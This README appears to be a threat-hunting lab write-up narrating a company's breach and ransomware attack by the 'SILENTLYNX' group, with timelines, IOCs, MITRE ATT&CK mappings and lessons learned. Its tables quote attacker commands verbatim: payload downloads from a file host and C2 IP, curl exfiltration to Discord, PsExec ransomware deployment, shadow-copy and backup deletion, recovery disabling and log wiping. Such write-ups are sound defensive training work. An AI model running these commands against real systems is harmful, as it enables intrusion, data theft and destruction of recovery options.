<img width="1536" height="1024" alt="azuki" src="https://github.com/user-attachments/assets/7ef8ff3d-6040-41dd-b293-7a8c104ae93a" />

# 🏮 The Azuki Breach Saga — Full Incident Summary
**Company:** Azuki Import/Export Trading Co. (梓貿易株式会社)
**Industry:** Shipping Logistics — Japan / Southeast Asia
**Employees:** 23
**Incident Period:** November 19 – November 27, 2025
**Outcome:** Full ransomware deployment — zero recovery options remaining

---

## 🔴 Situation

A competitor undercut Azuki's 6-year shipping contract by exactly 3%. Internal supplier contracts and pricing data appeared on underground forums — indicating a data breach. One week later, threat actors returned for total destruction, deploying ransomware across the entire network and eliminating every recovery option before anyone arrived Monday morning.

---

## 📅 The Full Story

---

### Part 1 — Initial Access & Espionage
**Date:** November 19, 2025

An attacker connected via **RDP** from external IP `88.97.178.12` using compromised IT admin credentials belonging to **kenji.sato** on the workstation **AZUKI-SL**. Within 33 minutes they executed a fully scripted attack chain driven by a PowerShell script `wupdate.ps1`:

| Time [UTC] | Action |
|---|---|
| `6:36 PM` | RDP logon from `88.97.178.12` via `kenji.sato` |
| `6:49 PM` | Windows Defender exclusions added — `.exe`, `.ps1`, `.bat` |
| `7:04 PM` | Network reconnaissance via `arp -a` |
| `7:05 PM` | Hidden staging directory created — `C:\ProgramData\WindowsCache` |
| `7:06 PM` | Tools downloaded via `certutil.exe` from C2 `78.141.196.6:8080` |
| `7:07 PM` | Mimikatz (`mm.exe`) executed — credentials dumped from LSASS memory |
| `7:07 PM` | Scheduled task `Windows Update Check` created as SYSTEM |
| `7:08 PM` | Data archived into `export-data.zip` |
| `7:09 PM` | `export-data.zip` exfiltrated to Discord via `curl.exe` |
| `7:09 PM` | Backdoor account `support` added to local Administrators |
| `7:10 PM` | Lateral movement via RDP to internal host `10.1.0.188` |
| `7:11 PM` | Security, System, and Application event logs wiped via `wevtutil.exe` |

**Result:** Stolen data — shipping contracts and pricing — appeared on underground forums, costing Azuki a 6-year contract.

---

### Parts 2 & 3 — Deeper Compromise
**Date:** November 19–24, 2025

Using credentials stolen via Mimikatz, the attacker expanded their foothold across the network. They moved laterally between systems using RDP, continued reconnaissance, and maintained persistent access through the `support` backdoor account and the `Windows Update Check` scheduled task running `svchost.exe` as SYSTEM every night at 2:00 AM.

The attacker had full, undetected access to the Azuki network for **one week** before deploying ransomware.

---

### Part 4 — Total Destruction (The Final Chapter)
**Date:** November 25–27, 2025

The **SILENTLYNX** ransomware group returned for the kill. Their attack unfolded across 6 phases:

---

#### 🐧 Phase 1: Linux Backup Server Compromise

The attacker SSHed from **AZUKI-AdminPC** (`10.1.0.108`) into the Ubuntu 22.04 backup server **AZUKI-BackupSv** (`10.1.0.189`) using the `backup-admin` account — credentials found in a **plaintext file stored on the backup server itself**.

| Action | Command |
|---|---|
| Remote access | `"ssh.exe" backup-admin@10.1.0.189` |
| Directory enumeration | `ls --color=auto -la /backups/` |
| File search | `find /backups -name *.tar.gz` |
| Account enumeration | `cat /etc/passwd` |
| Scheduled job recon | `cat /etc/crontab` |
| **Credential theft** 🔑 | `cat /backups/configs/all-credentials.txt` |
| Tool download | `curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z` |
| **Backup destruction** 💣 | `rm -rf /backups/archives /backups/databases /backups/daily ...` |
| Service stopped | `systemctl stop cron` |
| Service disabled | `systemctl disable cron` |

> 🔑 **The single most devastating finding:** `/backups/configs/all-credentials.txt` contained **every password on the network** stored in plaintext — inside the backup server itself. This one file handed the attacker the keys to everything.

---

#### 💻 Phase 2: Windows Ransomware Deployment

Using stolen credentials, the attacker deployed `silentlynx.exe` simultaneously to all Windows machines using **PsExec64.exe**:

```
"PsExec64.exe" \\10.1.0.102 -u kenji.sato -p ********* -c -f C:\Windows\Temp\cache\silentlynx.exe
"PsExec64.exe" \\10.1.0.188 -u fileadmin -p ********* -c -f C:\Windows\Temp\cache\silentlynx.exe
"PsExec64.exe" \\10.1.0.204 -u kenji.sato -p ********* -c -f C:\Windows\Temp\cache\silentlynx.exe
```

Every critical Windows system was hit simultaneously.

---

#### 🛡️ Phase 3: Recovery Inhibition

Every recovery option was systematically eliminated:

| Action | Command |
|---|---|
| Shadow Copy Service stopped | `"net" stop VSS /y` |
| Backup Engine stopped | `"net" stop wbengine /y` |
| Windows Defender killed | `"taskkill.exe" /F /IM MsMpEng.exe` |
| All database processes killed | `"taskkill" /F /IM sqlservr.exe` + mysql, oracle, postgres, mongodb |
| Shadow copies deleted | `"vssadmin.exe" delete shadows /all /quiet` |
| Shadow storage limited | `"vssadmin.exe" resize shadowstorage /for=C: /on=C: /maxsize=401MB` |
| Recovery disabled | `"bcdedit" /set {default} recoveryenabled No` |
| Backup catalogue deleted | `"wbadmin" delete catalog -quiet` |

---

#### 🔒 Phase 4: Persistence

The attacker ensured they would survive any recovery attempt:

| Method | Detail |
|---|---|
| Registry Run Key | `WindowsSecurityHealth` → `C:\Windows\Temp\silentlynx.exe` |
| Scheduled Task | `Microsoft\Windows\Security\SecurityHealthService` → runs `silentlynx.exe` on every logon at highest privilege |

Both were disguised as legitimate Windows security components.

---

#### 🧹 Phase 5: Anti-Forensics

```
"fsutil.exe" usn deletejournal /D C:
```

The USN journal — a file system log tracking every file change — was deleted to hamper forensic investigation and cover all tracks.

---

#### 💀 Phase 6: Ransomware Success

Monday morning, November 27, 2025 — one week after initial access — staff arrived to find ransom notes across every system:

```
SILENTLYNX_README.txt
```

---

## 🗺️ Network Overview

| Host | IP | Role | OS | Status |
|---|---|---|---|---|
| AZUKI-SL | 10.1.0.204 | Workstation | Windows 11 | 💀 Compromised |
| AZUKI-AdminPC | 10.1.0.108 | Admin | Windows 11 | 💀 Compromised |
| AZUKI-FS01 | 10.1.0.188 | File Server | Server 2022 | 💀 Ransomed |
| AZUKI-BackupSv | 10.1.0.189 | Backup Server | Ubuntu 22.04 | 💀 Wiped |

---

## 🔑 Key Indicators of Compromise

| Indicator | Type |
|---|---|
| `88.97.178.12` | Attacker initial access IP |
| `78.141.196.6:8080` | C2 server |
| `162.159.135.232` | Discord exfiltration endpoint |
| `https://litter.catbox.moe/io523y.7z` | Ransomware payload source |
| `C:\ProgramData\WindowsCache\` | Hidden staging directory |
| `C:\Users\kenji.sato\AppData\Local\Temp\wupdate.ps1` | Attack orchestration script |
| `Windows Update Check` | Malicious scheduled task (Part 1) |
| `Microsoft\Windows\Security\SecurityHealthService` | Malicious scheduled task (Part 4) |
| `support` | Backdoor local administrator account |
| `silentlynx.exe` | Ransomware payload |
| `destroy.7z` | Linux destruction toolkit |
| `SILENTLYNX_README.txt` | Ransom note |

---

## 🧠 MITRE ATT&CK Summary

| Technique ID | Name | Phase |
|---|---|---|
| T1078 | Valid Accounts | Initial Access |
| T1021.001 | Remote Desktop Protocol | Initial Access / Lateral Movement |
| T1021.004 | SSH | Lateral Movement |
| T1016 | System Network Configuration Discovery | Discovery |
| T1083 | File and Directory Discovery | Discovery |
| T1087.001 | Account Discovery: Local Account | Discovery |
| T1053.003 | Scheduled Task: Cron | Discovery |
| T1562.001 | Disable or Modify Tools | Defense Evasion |
| T1564.001 | Hidden Files and Directories | Defense Evasion |
| T1036.005 | Masquerading | Defense Evasion |
| T1070.001 | Clear Windows Event Logs | Defense Evasion |
| T1070.004 | Indicator Removal: File Deletion | Defense Evasion |
| T1003.001 | OS Credential Dumping: LSASS | Credential Access |
| T1552.001 | Credentials in Files | Credential Access |
| T1105 | Ingress Tool Transfer | Command & Control |
| T1074.001 | Data Staged: Local Data Staging | Collection |
| T1560.001 | Archive Collected Data | Collection |
| T1567.002 | Exfiltration Over Web Service | Exfiltration |
| T1569.002 | System Services: Service Execution | Execution |
| T1136.001 | Create Account: Local Account | Persistence |
| T1547.001 | Registry Run Keys | Persistence |
| T1053.005 | Scheduled Task | Persistence |
| T1489 | Service Stop | Impact |
| T1485 | Data Destruction | Impact |
| T1490 | Inhibit System Recovery | Impact |
| T1486 | Data Encrypted for Impact | Impact |

---

## 💡 Root Cause

> A single plaintext credentials file — `/backups/configs/all-credentials.txt` — stored **inside the backup server it was meant to protect** — handed the attacker every password on the network. This one misconfiguration turned a data breach into complete organisational destruction.

**Lessons learned:**
- Never store credentials in plaintext files
- Never store credentials on the systems they protect
- Network segment backup infrastructure from workstations
- Offsite / immutable backups are non-negotiable
- Monitor for SSH lateral movement between Windows and Linux systems

---

*Azuki Import/Export — 梓貿易株式会社 | The Azuki Breach Saga — All Parts*
*Investigation conducted using Microsoft Defender for Endpoint & KQL*


